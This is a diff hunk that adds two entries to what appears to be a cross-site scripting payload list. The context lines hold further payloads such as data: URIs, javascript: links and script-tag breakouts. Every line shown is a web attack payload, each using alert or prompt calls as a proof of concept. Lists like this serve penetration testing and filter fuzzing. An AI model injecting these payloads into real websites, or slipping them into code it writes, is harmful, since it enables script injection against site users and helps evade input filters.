@@ -984,4 +984,6 @@ data:text/html<svg/onload=parentNode.parentNode.parentNode[/locatio/.source+/n/.
 [test](javascript://%0d%0aprompt(1);com)
 "><script/src=data:,alert(1)%2b"
 "><script/src=data:,alert(1)%26sol;%26sol;
+</script><script>alert(1)+"
+"</script><svg><script>alert(1)+&quot;";
 /* RFI STOP */
